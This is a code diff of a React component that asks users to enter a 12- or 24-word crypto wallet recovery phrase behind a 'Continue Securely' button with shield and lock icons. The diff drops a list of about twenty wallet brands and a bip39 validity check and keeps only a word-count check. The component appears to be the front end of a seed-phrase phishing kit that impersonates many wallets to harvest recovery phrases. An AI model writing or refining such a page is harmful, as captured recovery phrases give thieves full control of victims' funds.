@@ -5,39 +5,10 @@ import { Button } from "@/components/ui/button"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { Textarea } from "@/components/ui/textarea"
 import { Shield, Lock } from "lucide-react"
-// You need to install 'bip39' for mnemonic validation:
-// npm install bip39
-import * as bip39 from "bip39"
-
-const WALLET_MNEMONIC_LENGTHS = {
-  "Jupiter": [12, 24],
-  "Blockchain.com": [12, 24],
-  "Magic Eden": [12, 24],
-  "Bifrost Wallet": [12, 24],
-  "Tangem Wallet": [12, 24],
-  "WEMIX Play": [12, 24],
-  "Robinhood Wallet": [12, 24],
-  "Bitcoin.com Wallet": [12, 24],
-  "Solflare": [12, 24],
-  "MathWallet": [12, 24],
-  "BlackFort Wallet": [12, 24],
-  "Keplr": [12, 24],
-  "BeeWallet": [12, 24],
-  "VeWorld Mobile": [12, 24],
-  "Best Wallet": [12, 24],
-  "LOBSTR Wallet": [12, 24],
-  "Fastex Wallet": [12, 24],
-  "Pintu": [12, 24],
-  "Core": [12, 24],
-  "Opera Crypto Browser": [12, 24],
-  "Cobalt Wallet": [12, 24],
-  // Add more wallets and their valid mnemonic lengths if needed
-}
 
 export default function WalletPhrase({ selectedWallet, onPhraseSubmit }) {
   const [phrase, setPhrase] = useState("")
   const [wordCount, setWordCount] = useState(0)
-  const [error, setError] = useState("")
 
   const handlePhraseChange = (value) => {
     setPhrase(value)
@@ -46,28 +17,12 @@ export default function WalletPhrase({ selectedWallet, onPhraseSubmit }) {
       .split(/\s+/)
       .filter((word) => word.length > 0)
     setWordCount(words.length)
-    setError("") // Clear error on change
-  }
-
-  const validateMnemonic = (mnemonic, wallet) => {
-    const validLengths = WALLET_MNEMONIC_LENGTHS[wallet] || [12, 24]
-    const words = mnemonic.trim().split(/\s+/)
-    if (!validLengths.includes(words.length)) {
-      return `Mnemonic must be ${validLengths.join(" or ")} words for ${wallet}.`
-    }
-    if (!bip39.validateMnemonic(mnemonic)) {
-      return "Invalid mnemonic phrase. Please check for typos."
-    }
-    return ""
   }
 
   const handleContinue = () => {
-    const validationError = validateMnemonic(phrase, selectedWallet)
-    if (validationError) {
-      setError(validationError)
-      return
+    if (phrase.trim() && (wordCount === 12 || wordCount === 24)) {
+      onPhraseSubmit(phrase)
     }
-    onPhraseSubmit(phrase)
   }
 
   return (
@@ -109,14 +64,11 @@ export default function WalletPhrase({ selectedWallet, onPhraseSubmit }) {
               </span>
               <span>{wordCount}/24</span>
             </div>
-            {error && (
-              <div className="text-red-500 text-xs mt-1">{error}</div>
-            )}
           </div>
 
           <Button
             onClick={handleContinue}
-            disabled={!phrase.trim() || wordCount < 12}
+            disabled={!phrase.trim() || (wordCount !== 12 && wordCount !== 24)}
             className="w-full bg-blue-500 hover:bg-blue-600 text-white py-3 rounded-lg font-medium disabled:bg-gray-300"
           >
             Continue Securely
